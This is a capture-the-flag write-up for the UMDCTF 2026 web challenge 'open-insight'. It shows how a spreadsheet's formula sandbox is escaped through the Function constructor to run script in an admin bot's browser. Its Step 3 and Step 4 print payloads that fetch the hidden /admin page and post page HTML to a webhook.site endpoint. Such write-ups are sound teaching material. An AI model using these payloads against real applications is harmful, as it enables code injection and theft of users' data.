---
title: "OpenInsight: Sandbox Escape & Bot Exploitation"
date: 2026-04-25
ctf_event: "UMDCTF 2026"
challenge_name: "open-insight"
category: "Web"
tags: ["formula-injection", "sandbox-escape", "bot", "xss", "ssrf"]
points: 500
difficulty: "Hard"
description: "Bypassing a custom JS sandbox via Formula Injection, executing code in a headless admin bot, and exfiltrating a restricted page via SSRF."
author: "Vo1ic"
draft: false
---

## Challenge Description

The challenge provides two main resources:
1.  **OpenInsight** (`open-insight.challs.umdctf.io`) — a web application for creating and managing spreadsheets (workbooks).
2.  **Admin Review Queue** (`open-insight-bot.challs.umdctf.io`) — a bot service where you can submit a `sheetId` for administrative review.

Goal: Gain access to the admin panel and retrieve the flag.

## Initial Analysis

The Review Queue page specifies that the bot opens submitted workbooks using moderator credentials in a one-time browser session. Testing with an invalid `sheetId` (e.g., `123`) triggered a specific error:
`Waiting for selector '[data-cell-rendered="true"]' failed: Waiting failed: 6000ms exceeded`.
This confirms that a headless browser (Puppeteer/Playwright) is running on the backend, visiting the spreadsheet and waiting for it to render.

The application is built using React Server Components (Next.js). Standard XSS attempts (e.g., `<script>`) failed because the frontend automatically escapes all HTML input, rendering it as plain text.

## Step 1 — Formula Injection

While exploring the spreadsheet interface, we found a hint: `Type a value or =expression, Enter to commit`. 
Entering a mathematical expression like `=1+1` correctly returned `2`. This indicates that the client-side uses a custom handler (likely `eval` or `new Function`) to execute code prefixed with `=`.

Attempts to call global functions like `=fetch()` or access `window.location` resulted in errors like `#ERR: fetch is not a function`. This points to a JS Sandbox isolating the formula execution context from global browser objects.

## Step 2 — Sandbox Escape

To break out of the sandbox and access the global scope, we used the classic trick of accessing the global function constructor through the prototypes of basic data types:

```javascript
=(1).constructor.constructor("YOUR_CODE_HERE")()
```

This approach allows the creation of a new function outside the restricted sandbox environment. A test payload confirmed full Remote Code Execution (RCE) within the context of the browser tab.

## Step 3 — Bot SSRF and HttpOnly Bypass

The next logical step was stealing the admin's `document.cookie`. However, the cookies were protected by the `HttpOnly` flag and remained inaccessible to JavaScript.

Since we can execute code as the admin, we decided to exfiltrate the entire HTML of the page to see what the moderator sees:

```javascript
=(1).constructor.constructor("return fetch('https://webhook.site/YOUR_ID/', {method: 'POST', body: document.documentElement.innerHTML})")()
```

The exfiltrated HTML revealed a hidden navigation element: `<a href="/admin">Admin ▸</a>`.

## Step 4 — Data Exfiltration

The final attack vector (Client-Side SSRF) involved forcing the bot's browser to request the `/admin` page, read the response, and send it to our server.

To ensure the spreadsheet saves the formula correctly without crashing during the asynchronous fetch, we added `return 1` at the end:

```javascript
=(1).constructor.constructor("fetch('/admin').then(r=>r.text()).then(html=>fetch('https://webhook.site/YOUR_ID/',{method:'POST',body:html}));return 1")()
```

After submitting the `sheetId` to the bot, a POST request arrived at our webhook containing the full content of the admin panel and the "Master flag".

## Flag

`UMDCTF{r0ll_y0ur_0wn_s4nit1zat1on}`